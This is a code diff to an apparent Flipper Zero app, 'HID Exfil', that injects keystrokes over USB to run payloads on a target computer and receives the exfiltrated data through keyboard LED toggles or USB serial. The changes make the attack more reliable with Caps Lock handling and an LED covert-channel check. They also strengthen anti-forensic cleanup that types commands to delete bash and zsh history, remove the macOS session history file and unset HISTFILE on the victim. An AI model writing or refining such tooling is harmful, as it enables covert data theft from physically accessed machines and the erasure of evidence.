@@ -1,3 +1,7 @@
+/* hid_exfil_worker.c — Background worker thread for HID Exfil.
+ * Drives USB HID keystroke injection and captures exfiltrated data
+ * via the HID LED channel or USB CDC serial. */
+
 #include "hid_exfil_worker.h"
 #include "hid_exfil_payloads.h"
 #include <furi.h>
@@ -139,6 +143,18 @@ static uint16_t char_to_hid_key(char c, bool* need_shift) {
     }
 }
 
+/* Ensure Caps Lock is OFF on the target before typing.
+ * If Caps Lock is on, Shift+Key produces the OPPOSITE case on Windows,
+ * causing "[KBLed]" to be typed as "[kblED]" and breaking the script. */
+static void ensure_capslock_off(void) {
+    uint8_t leds = furi_hal_hid_get_led_state();
+    if(leds & HID_KB_LED_CAPS) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
+        furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+        furi_delay_ms(50);
+    }
+}
+
 /* Type a single character via HID */
 static void type_char(char c, uint32_t delay_ms) {
     if(c == '\r') return; /* skip CR */
@@ -189,6 +205,11 @@ static bool phase_inject(HidExfilWorker* worker) {
     }
 
     uint32_t delay = worker->config.injection_speed_ms;
+
+    /* Clear Caps Lock before typing — if CapsLock is on, Shift+Key produces
+     * the opposite case on Windows, turning [KBLed] into [kblED] and breaking
+     * the Add-Type class definition. */
+    ensure_capslock_off();
 
     /* Open terminal based on target OS */
     switch(worker->config.target_os) {
@@ -455,6 +476,10 @@ static void phase_cleanup(HidExfilWorker* worker) {
 
     uint32_t delay = worker->config.injection_speed_ms;
 
+    /* Clear Caps Lock again — the LED encoding protocol may have left it on.
+     * The EOT sequence toggles CapsLock 3 times (odd), which flips the state. */
+    ensure_capslock_off();
+
     switch(worker->config.target_os) {
     case TargetOSWindows:
         /* Clear PowerShell history and close */
@@ -470,21 +495,35 @@ static void phase_cleanup(HidExfilWorker* worker) {
         break;
 
     case TargetOSLinux:
-        /* Clear bash history and close */
+        /* Clear history for both bash and zsh — Ctrl+Alt+T opens the user's
+         * default shell which may be either.  `unset HISTFILE` prevents both
+         * shells from writing history on exit. */
         furi_delay_ms(300);
-        type_string("history -c && history -w\r\n", delay, worker);
+        type_string("rm -f ~/.bash_history ~/.zsh_history\r\n", delay, worker);
         furi_delay_ms(200);
-        type_string("rm -f ~/.bash_history\r\n", delay, worker);
+        type_string("unset HISTFILE\r\n", delay, worker);
         furi_delay_ms(200);
         type_string("exit\r\n", delay, worker);
         break;
 
     case TargetOSMac:
-        /* Clear zsh history and close */
+        /* Clear zsh history and close.
+         * `history -p` is csh/tcsh only — it does nothing in zsh (macOS
+         * default since Catalina).  Without `unset HISTFILE`, zsh writes
+         * the in-memory history (including payload commands) to a new
+         * ~/.zsh_history on exit, defeating the cleanup.
+         * Terminal.app also saves per-session history via a precmd hook
+         * in /etc/zshrc_Apple_Terminal to ~/.zsh_sessions/ (*.history).
+         * Removing $SHELL_SESSION_FILE and unsetting it prevents that. */
         furi_delay_ms(300);
         type_string("rm -f ~/.zsh_history ~/.bash_history\r\n", delay, worker);
         furi_delay_ms(200);
-        type_string("history -p\r\n", delay, worker);
+        type_string(
+            "[ -n \"$SHELL_SESSION_FILE\" ] && rm -f \"$SHELL_SESSION_FILE\" 2>/dev/null\r\n",
+            delay,
+            worker);
+        furi_delay_ms(200);
+        type_string("unset HISTFILE SHELL_SESSION_FILE\r\n", delay, worker);
         furi_delay_ms(200);
         type_string("exit\r\n", delay, worker);
         break;
@@ -562,6 +601,36 @@ static int32_t hid_exfil_worker_thread(void* context) {
 
     bool success = true;
 
+    /* Pre-flight: Test LED state readability.
+     * The LED covert channel requires the Flipper to read CapsLock/NumLock/
+     * ScrollLock state from the host via USB HID Output Reports.
+     * Firmware builds without the Set_Report handler (upstream bug #4162)
+     * will always read 0, making the entire exfil channel non-functional.
+     *
+     * Toggle CapsLock and check if the LED state changes. If not, warn. */
+    {
+        uint8_t before = furi_hal_hid_get_led_state();
+        furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
+        furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+        furi_delay_ms(200);
+        uint8_t after = furi_hal_hid_get_led_state();
+
+        /* Restore CapsLock regardless */
+        furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
+        furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+        furi_delay_ms(100);
+
+        if(((after ^ before) & HID_KB_LED_CAPS) == 0) {
+            FURI_LOG_W(
+                TAG,
+                "LED state not updating — firmware may lack Set_Report handler. "
+                "LED covert channel will not work. See firmware issue #4162.");
+            worker->state.led_channel_broken = true;
+        } else {
+            worker->state.led_channel_broken = false;
+        }
+    }
+
     /* Phase 1: Inject payload */
     if(success && worker->running) {
         success = phase_inject(worker);
@@ -627,7 +696,7 @@ HidExfilWorker* hid_exfil_worker_alloc(void) {
      * is only consumed when the user actually begins an exfil run,
      * not every time the app opens. */
 
-    worker->thread = furi_thread_alloc_ex("HidExfilWorker", 2048, hid_exfil_worker_thread, worker);
+    worker->thread = furi_thread_alloc_ex("HidExfilWorker", 4096, hid_exfil_worker_thread, worker);
 
     return worker;
 }
@@ -690,6 +759,8 @@ bool hid_exfil_worker_start(HidExfilWorker* worker) {
     /* Zero only the portion we will use (full buffer on first run). */
     memset(worker->recv_buffer, 0, worker->recv_buffer_size);
     worker->state.bytes_received = 0;
+
+    furi_thread_join(worker->thread);
 
     worker->running = true;
     furi_thread_start(worker->thread);
